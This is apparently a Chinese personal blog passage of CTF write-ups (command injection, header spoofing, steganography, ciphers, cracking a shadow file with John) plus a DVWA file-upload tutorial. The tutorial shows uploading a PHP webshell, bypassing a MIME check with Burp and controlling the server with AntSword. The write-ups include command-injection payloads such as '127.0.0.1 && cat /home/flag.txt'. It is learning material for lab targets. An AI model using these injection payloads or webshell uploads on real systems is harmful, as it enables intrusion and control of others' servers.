src="https://img-blog.csdnimg.cn/20200324105831132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后写数据<br><img src="https://img-blog.csdnimg.cn/20200324105953312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>连接密码是shell因为那一行php一句话木马，点击添加就成功了。然后查看就看到flag了。结果就不展示了。<h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a><h5 id="3">command_execution</h5></h1>攻防世界的一道入门题，看到command应该是cmd，<br>题目：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。<br>ping只知道它可以pingIP地址，具体的干什么的其实不是特别清楚，去看下。<a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/ping">ping官方解释</a><br>做这个题还要知道一点：cmd1 &amp;&amp; cmd2先执行cmd1再执行cmd2，cmd1 | cmd2 只执行cmd2，但不执行cmd1 ，cmd1 &amp; cmd2 先执行cmd2，再执行cmd1.<br>然后就构造三个Windows命令来解题<br>payload<br><code>127.0.0.1 &amp;&amp; ls</code>尝试用ls获取当前目录<br><code>127.0.0.1 &amp;&amp;find / -name &quot;*.txt&quot;</code>寻找txt文件<br><img src="https://img-blog.csdnimg.cn/2020032422014410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><code>127.0.0.1 &amp;&amp; cat/home/flag.txt</code>找到flag<br><img src="https://img-blog.csdnimg.cn/2020032422021861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题还是要对Windows命令进行了解的。<a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/windows-commands">Windows命令</a></li></ul></li></ul><h1 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a><h5 id="4">xff_referer</h5></h1><p><img src="https://img-blog.csdnimg.cn/20200325073307983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>xff（X-Forwarded-For）</p><blockquote><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 Squid 缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由IETF在HTTP头字段标准化草案[1]中正式提出。<br>当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。<br>如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。XFF的有效性依赖于代理服务器提供的连接原始IP地址的真实性，因此，XFF的有效使用应该保证代理服务器是可信的，比如可以通过创建可信服务器白名单的方式。<br>******可以通过修改xff来伪装一个IP<br>  ———————来自维基百科</p></blockquote><p>Referer</p><blockquote><p>检查Referer字段<br><strong>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址</strong>。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于<a href="http://www.examplebank.com之下.而如果是csrf攻击传来的请求,referer字段会是包含恶意网址的地址,不会位于www.examplebank.com之下,这时候服务器就能识别出恶意的访问./">www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。</a><br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，<strong>篡改其Referer字段</strong>的可能。<br>————来自维基百科</p></blockquote><p>没见过这种题，一点头绪都没有，看看别人的思路是什么样的，然后发现两种方法解这个题。<br>1.burp修改http和cookie<br>先抓包（我的这个burp有点任性，总是看心情抓的。我也很无奈。）<br><img src="https://img-blog.csdnimg.cn/20200325075400215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加一行xff</p><pre class="language-payload" data-language="payload"><code class="language-payload">X-Forwarded-For: 123.123.123.123</code></pre><p><img src="https://img-blog.csdnimg.cn/20200325075612270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>放包（Forward）然后会看到浏览器页面已经有变化了。<br><img src="https://img-blog.csdnimg.cn/20200325080017355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>出现了提示，再次刷新网页重新抓包<br>添加xff和Referer两条</p><pre class="language-payload" data-language="payload"><code class="language-payload">X-Forwarded-For: 123.123.123.123Referer: https:&#x2F;&#x2F;www.google.com</code></pre><p><img src="https://img-blog.csdnimg.cn/20200325080459990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再次放包，就拿到了flag<br><img src="https://img-blog.csdnimg.cn/20200325080603542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第二种方法<br>使用谷歌浏览器的ModHeader插件修改，添加X-Forwarded-For的name和value。<br><img src="https://img-blog.csdnimg.cn/20200325081042966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后看到我的页面刷新后有变化了。<br><img src="https://img-blog.csdnimg.cn/2020032508130955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加Referer<br><img src="https://img-blog.csdnimg.cn/20200325081514815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>修改后，再次刷新页面就得到了flag<br><img src="https://img-blog.csdnimg.cn/20200325081720901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>感觉插件比burp方便很多😎😎😎参考的这位大佬的博客里面有使用<a href="https://blog.csdn.net/God_XiangYu/article/details/100644086">插件的详细步骤</a></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><h3 id="5">Misc</h3></h3><h1 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a><h5 id="6">基础破解</h5></h1><p><img src="https://img-blog.csdnimg.cn/20200325131628344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个下载压缩包后，直接解压，里面还有压缩包，而且还加密了，加密的压缩包目前我知道并且能想到的有两种可能，就是暴力破解和伪加密，我是先试暴力破解的，运气不错，直接破解出来了。<br><img src="https://img-blog.csdnimg.cn/20200325131350970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以打开加密文件，<br><img src="https://img-blog.csdnimg.cn/20200325132205106.png" alt="Augenstern" loading="lazy"><br>base64解密就OK了，果然基础。这道题我感觉我再水题了。😂😂😂</p><h1 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a><h5 id="7">镜子里面的世界</h5></h1><p>做了半天可算找到一个不会让人觉得我在水题的题了<br><img src="https://img-blog.csdnimg.cn/20200325154858501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到图片，话不多说，先看看里面有没有隐藏文件再说，发送到foremost，然后没找到，<br>这个时候，再看图片，<img src="https://img-blog.csdnimg.cn/202003251556235.png" alt="Augenstern" loading="lazy"><br>刚开始没注意到图片名，就先去winhex里找了一波，找不到。又回去看了图片，才注意到文件名有点熟悉，，stegsolve。然后就放里面找，发现有几张图有点特别<br><img src="https://img-blog.csdnimg.cn/20200325155913359.png" alt="Augenstern" loading="lazy"><br>第一眼看着像摩斯密码，我就把它保存成MP3 文件了，但是打不开。奇怪，之前我记得这样的一道题是摩斯密码来着，然后就看看preview。发现了key<br><img src="https://img-blog.csdnimg.cn/20200325160627166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h1 id="教练，我-我想打CTF"><a href="#教练，我-我想打CTF" class="headerlink" title="教练，我..我想打CTF"></a><h5 id="8">教练，我..我想打CTF</h5></h1><p>他来了，他来了……<br><img src="https://img-blog.csdnimg.cn/20200325172221601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>老样子，foremost分离看看……然后什么也没找到。下一步进winhex，不幸的是还是什么都没有……<br>stegsolve，这次终于有东西了，不然我目前就没有其他办法了。<br><img src="https://img-blog.csdnimg.cn/20200325172651336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到了文件头是<code>504b0304</code>这是一个zip文件的文件头，可以知道这是个zip压缩包。就把它命名成<code>1.zip</code>吧。<br>打开之后，什么文件？？？<br><img src="https://img-blog.csdnimg.cn/20200325172941401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>改，txt，什么的我全试了一遍每一个管用的。前面还挺顺利，又卡壳了，，，，不好的预感，这是要踩坑的节奏啊。然后就找大佬的wp找到了几个，kali？？，又跟kali扯上关系了。要下载，，，（不踩坑，不踩坑。）zsteg又是一个工具，没见过，有收获了。kali下载，<br>下载命令：<code>gem install zsteg</code><br>反正我用这个命令下载贼慢，而且还没下载上。可能是我天生被坑眷顾。我就找源码下载。刚开始看了一个博主的教程，结果跟我说地址拒绝连接。。。。。。该来的还是来了。<br>我自己找到的原链接：命令嘛<br>就是：<code>git clone https://github.com/zed-0xff/zsteg.git</code><br>成功安装<br><img src="https://img-blog.csdnimg.cn/20200325174212424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>安装gem：</p><p>命令：<code>apt-get install gem</code><br><img src="https://img-blog.csdnimg.cn/20200325174615872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后安装zsteg<br>命令：<code>gem install zsteg</code><br><img src="https://img-blog.csdnimg.cn/20200325180930361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>怎么说，安装过程可能要等上那么一段时间，嘿嘿，时间也不长，估计十几二十分钟吧，反正我的kali都自动挂起了，不要点其他的东西（回车也别点，不信看我上面的图，第四行和第五行，因为手*敲了回车。重来了），否则可能重来。啧啧啧。过程很痛苦。<br>废话不多说继续进行下一步<br>把在物理机上的压缩包复制到kali桌面上。然后右键单击压缩包，在此解压。像这样<br><img src="https://img-blog.csdnimg.cn/202003251922025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后，进入桌面的文件夹，<br>执行命令：<code>chmod 777 1</code>提到权限<br>再执行<code>./1</code>打开文件，出现flag如下图<br><img src="https://img-blog.csdnimg.cn/20200325191938635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>不对啊，好像没怎么用到zsteg这个东西。算了，总归安装了也不亏啥，还了解有这么一个工具。<br>听说这道题还是一道非常经典的题。做出来心情爽。</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><h3 id="9">Crypto</h3></h3><h3 id="凯撒？替换？呵呵"><a href="#凯撒？替换？呵呵" class="headerlink" title="凯撒？替换？呵呵!"></a><h5 id="10">凯撒？替换？呵呵!</h5></h3><p><img src="https://img-blog.csdnimg.cn/20200325135458820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到这个题目，我感受到了迷之嘲讽，眯眼🥱🥱，搞个锤子奥，这个是啥玩意儿？？凯撒变种也没这么变的吧，，，我先用凯撒解密把F搞出来，然后栅栏解密开始一顿解，，，，白玩了。啥也没解出来。一看wp，这变种的真不一样，要暴力破解<a href="https://quipqiup.com/">https://quipqiup.com/</a>，爆破原理我也没搞懂，😣😣😣真菜，菜的抠脚。<img src="https://img-blog.csdnimg.cn/20200325140605325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="告诉你个秘密"><a href="#告诉你个秘密" class="headerlink" title="告诉你个秘密"></a><h5 id="11">告诉你个秘密</h5></h3><p>这道题真的考验我这种练习时长两个月的新人的脑洞。我就不行了，真是菜的抠脚。<br><img src="https://img-blog.csdnimg.cn/20200325211101463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>文件就是两串数字<br><img src="https://img-blog.csdnimg.cn/20200325211210310.png" alt="Augenstern" loading="lazy"><br>先十六进制转字符<br><img src="https://img-blog.csdnimg.cn/20200325211349243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后再进行base64解密<br><img src="https://img-blog.csdnimg.cn/20200325211449569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这解出来的数字在键盘上看。比如第一个<br><img src="https://img-blog.csdnimg.cn/20200325212312906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>四个字母中间包了一个字母，那就是flag的第一个字母，以此类推。拿到flag。提交不用加flag，也不用加cyberpeace，解出来什么就是什么。<br>反正我是想不起来，也没给点提示啊。无奈脑洞太小，菜的抠脚。</p><h3 id="Crack-it"><a href="#Crack-it" class="headerlink" title="Crack it"></a><h5 id="12">Crack it</h5></h3><p>看着来源就感觉好牛逼的样子<br><img src="https://img-blog.csdnimg.cn/2020032608380117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开文件又是一个没有扩展名的文件，这看看记事本打开是什么样子的。<br><img src="https://img-blog.csdnimg.cn/20200326084051376.png" alt="Augenstern" loading="lazy"><br>好吧看不出来是什么加密。没见过，看下wp，呃呃呃呃呃，还真是，上面那个想打CTF的那个题就是没有扩展名，要在kali里解。这个也一样那就打开kali解。<br>先进入shadow所在的文件夹位置。呃呃呃呃呃忽略我,下面的操作（看有效部分就OK），啥都不会，<br><img src="https://img-blog.csdnimg.cn/20200326082135187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后John，听说这个人很牛8，<br>直接用John命令的话，可能会无法使用所以先打开john这个程序。<br>打开方式：<br><img src="https://img-blog.csdnimg.cn/20200326090152330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后直接在搜索框里搜john就行了。<br>（我原本以为还要下载）<br>然后就进入到终端了，需要注意的一点就是：<br>1.你是以root账户打开kali的：</p><pre class="language-payload" data-language="payload"><code class="language-payload">john --show shadow</code></pre><p>2.以普通管理员账户打开：</p><pre class="language-payload" data-language="payload"><code class="language-payload">sudo john --show shadow</code></pre><p>就这样，出现了下面的结果<br><img src="https://img-blog.csdnimg.cn/20200326083537855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag是hellokitty</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞的了解和初次尝试</title>
      <link href="/posts/17b1c101/"/>
      <url>/posts/17b1c101/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传概念"><a href="#文件上传概念" class="headerlink" title="文件上传概念"></a>文件上传概念</h1><p>在各种网站，应该说基本的网站就会有上传文件的功能，比如说让上传个<code>.jpg、.png、.mp4</code>等文件，就拿一个普普通通的网站来说，注册账户后常见的换头像，换背景，可以把背景设置成一个短视频了等等。而文件上传漏洞就是这个上传文件的功能没有做好防护而产生的漏洞。<br>用户把文件上传到服务器的时候，服务器会检测用户上传的文件是否符合规则，不符合规则的文件（比如一句话木马等php文件）服务器会拒绝接受，用户就无法上传成功。<br>但是一旦上传成功，可以通过一句话木马构造的密码，用菜刀之类的工具来连接服务器。<br>刚学习文件上传漏洞，就拿靶机试一下。</p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="low级别测试"><a href="#low级别测试" class="headerlink" title="low级别测试"></a>low级别测试</h2><p>先看源码。（DVWA里提供PHP源码查看。）<br><img src="https://img-blog.csdnimg.cn/20200407162415175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看看靶机提供的PHP源码。好像是没有什么限制条件。待会对比一下中级的。</p><h3 id="测试用到的工具、环境"><a href="#测试用到的工具、环境" class="headerlink" title="测试用到的工具、环境"></a>测试用到的工具、环境</h3><p>环境：DVWA（Damn Vulnerable Web Application!）<br>工具：中国蚁剑、一句话木马文件</p><h3 id="测试操作"><a href="#测试操作" class="headerlink" title="测试操作"></a>测试操作</h3><p>首先在本地写个一句话木马，并保存一个位置<br><img src="https://img-blog.csdnimg.cn/20200330225317901.png" alt="Augenstern" loading="lazy"><br>来到靶场，上传文件<br><img src="https://img-blog.csdnimg.cn/20200330225544983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里就看到了上传成功了<br><img src="https://img-blog.csdnimg.cn/20200330225652198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>复制文件路径（当然这只是靶机，其他网站是不会有路径放出来的。）<br><img src="https://img-blog.csdnimg.cn/20200330230145309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>复制1那个到url框里，记得把“#”删了再粘贴。<br><img src="https://img-blog.csdnimg.cn/20200330230511486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>其实是空白，什么都没有，php代码是后端语言，在前端看不到的。所以这样很正常的。<br>然后打开中国蚁剑<br>添加数据<br><img src="https://img-blog.csdnimg.cn/20200330230837949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>连接密码就是一句话木马里的那个。<br><img src="https://img-blog.csdnimg.cn/20200330230932387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到连接成功了<br>然后就可以看到里面的信息甚至可以增、添、删、改服务器的数据<br><img src="https://img-blog.csdnimg.cn/20200402074150910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到，然后我把它删了，就出来一片红色警告。总之就是连不上了。</p><h2 id="medium级别测试"><a href="#medium级别测试" class="headerlink" title="medium级别测试"></a>medium级别测试</h2><p>靶机里调一下级别，调成中级。然后，我又去尝试了上传低级别的一句话木马，想看看对比。<br><img src="https://img-blog.csdnimg.cn/20200407162119614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>果然不行，看看PHP代码。<br><img src="https://img-blog.csdnimg.cn/20200407162613235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以对比出来中级的多了限制条件，只能传JPEG或者png图片并且还有大小限制。只能上传这个应该是100k的图片吧。<br>当然还有办法进行上传。这里需要绕过。但不是过狗啊，这里可没有狗，只是一个限制。所以想办法绕过。先了解一下mime文件类型和image文件类型<br><img src="https://img-blog.csdnimg.cn/20200407165728581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><a href="https://www.w3school.com.cn/media/media_mimeref.asp">了解mime</a><br>这个实验，上传mime实验。<br>操作示图：<br><img src="https://img-blog.csdnimg.cn/2020040910210511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="测试需要用到的工具"><a href="#测试需要用到的工具" class="headerlink" title="测试需要用到的工具"></a>测试需要用到的工具</h3><p>新朋友：burp suite<br>一句话木马，靶机环境：DVWA。连接工具：中国蚁剑。</p><h3 id="实验操作"><a href="#实验操作" class="headerlink" title="实验操作"></a>实验操作</h3><p>burp设置代理，开启burp，但是浏览器先不开代理。<br>开始选择准备上传的文件，先拿个txt文件试试水。<br><img src="https://img-blog.csdnimg.cn/20200407223717588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>开代理，传文件。抓包<br><img src="https://img-blog.csdnimg.cn/20200407223856237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>将type类型改为<code>image/jpeg</code>。然后放包。</p><p><img src="https://img-blog.csdnimg.cn/20200407224049482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>回到浏览器，看到了，上传成功了。<br><img src="https://img-blog.csdnimg.cn/20200407224227326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>查看一下上传的文件是什么样子的<br><img src="https://img-blog.csdnimg.cn/2020040722434643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到成功了，接下来就是传木马了。同样的操作。<br><img src="https://img-blog.csdnimg.cn/20200407224551759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>开蚁剑，连接<br><img 